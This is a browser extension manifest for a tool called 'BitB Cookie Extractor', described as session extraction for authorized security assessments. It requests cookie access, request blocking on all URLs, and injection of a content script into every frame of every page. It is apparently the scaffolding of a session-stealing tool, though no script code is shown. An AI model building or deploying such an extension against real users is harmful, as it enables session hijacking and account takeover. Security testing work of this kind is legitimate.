{
  "manifest_version": 2,
  "name": "BitB Cookie Extractor",
  "version": "1.0",
  "description": "Session extraction for authorized security assessments",
  "permissions": [
    "cookies",
    "storage",
    "activeTab",
    "webRequest",
    "webRequestBlocking",
    "<all_urls>",
    "notifications"
  ],
  "background": {
    "scripts": ["config.js", "background.js"],
    "persistent": true
  },
  "content_scripts": [
    {
      "matches": ["<all_urls>"],
      "js": ["content.js"],
      "run_at": "document_end",
      "all_frames": true
    }
  ],
  "browser_specific_settings": {
    "gecko": {
      "id": "bitb-cookie@security.local"
    }
  }
}
